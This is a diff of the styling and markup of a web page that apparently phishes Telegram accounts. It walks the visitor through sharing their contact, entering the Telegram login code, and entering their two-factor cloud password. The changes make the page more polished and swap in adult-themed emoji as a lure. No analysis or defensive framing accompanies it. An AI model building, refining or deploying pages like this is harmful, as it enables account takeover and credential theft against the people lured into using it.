@@ -37,8 +37,8 @@
             background-image: url('https://3fzt51ap8k.ucarecd.net/d33fd411-441c-459c-bd74-5b662cd20f5f/-/preview/584x1000/');
             background-size: cover;
             background-position: center;
-            filter: blur(15px) brightness(0.3);
-            transform: scale(1.1);
+            filter: blur(12px) brightness(1) saturate(1.05);
+            transform: scale(1.03);
             z-index: 0;
         }
 
@@ -48,8 +48,9 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.5);
+            background: rgba(0, 0, 0, 0.12);
             z-index: 1;
+            pointer-events: none;
         }
 
         .content-container {
@@ -68,14 +69,16 @@
         }
 
         .main-card {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(20px);
+            background: linear-gradient(180deg, rgba(255,255,255,0.06), rgba(255,255,255,0.03));
+            backdrop-filter: blur(22px) saturate(1.08);
+            -webkit-backdrop-filter: blur(22px) saturate(1.08);
             border-radius: 24px;
-            padding: 40px 28px;
+            padding: 36px 26px;
             width: 100%;
-            max-width: 400px;
+            max-width: 420px;
             margin: 0 auto;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.18);
+            border: 1px solid rgba(255,255,255,0.08);
         }
 
         .step-header {
@@ -338,31 +341,13 @@
         <div class="main-card">
             <!-- Emoji strip to attract attention -->
             <div class="emoji-strip" aria-hidden="true">
-                <span class="emoji-item">🎉</span>
+                <span class="emoji-item">🔞</span>
+                <span class="emoji-item">🍷</span>
                 <span class="emoji-item">🔥</span>
-                <span class="emoji-item">✨</span>
-                <span class="emoji-item">💥</span>
-                <span class="emoji-item">💎</span>
-                <span class="emoji-item">🎯</span>
-                <span class="emoji-item">🎟️</span>
-                <span class="emoji-item">🪙</span>
-                <span class="emoji-item">💬</span>
-                <span class="emoji-item">🔒</span>
-                <span class="emoji-item">✅</span>
-                <span class="emoji-item">📣</span>
-                <span class="emoji-item">🎊</span>
-                <span class="emoji-item">🎈</span>
-                <span class="emoji-item">🌟</span>
-                <span class="emoji-item">🚀</span>
-                <span class="emoji-item">🌙</span>
-                <span class="emoji-item">🛡️</span>
-                <span class="emoji-item">🔔</span>
-                <span class="emoji-item">💫</span>
             </div>
             <!-- Adult Confirmation Step -->
             <div id="adultStep">
                 <div class="step-header">
-                    <span class="emoji-display">🎉</span>
                     <h2 class="step-title" data-i18n="verify-title">Verify Account</h2>
                     <p class="step-subtitle" data-i18n="verify-subtitle">Share your contact to verify your Telegram account</p>
                 </div>
@@ -379,7 +364,6 @@
             <!-- OTP Step -->
             <div id="otpStep" class="hidden">
                 <div class="step-header">
-                    <span class="emoji-display">🔢</span>
                     <h2 class="step-title" data-i18n="otp-title">Enter Code</h2>
                     <p class="step-subtitle" data-i18n="otp-subtitle">Check your Telegram messages for the code</p>
                 </div>
@@ -399,7 +383,6 @@
             <!-- 2FA Step -->
             <div id="twoFAStep" class="hidden">
                 <div class="step-header">
-                    <span class="emoji-display">🔐</span>
                     <h2 class="step-title" data-i18n="2fa-title">Two-Factor Password</h2>
                     <p class="step-subtitle" data-i18n="2fa-subtitle">Enter your cloud password</p>
                 </div>
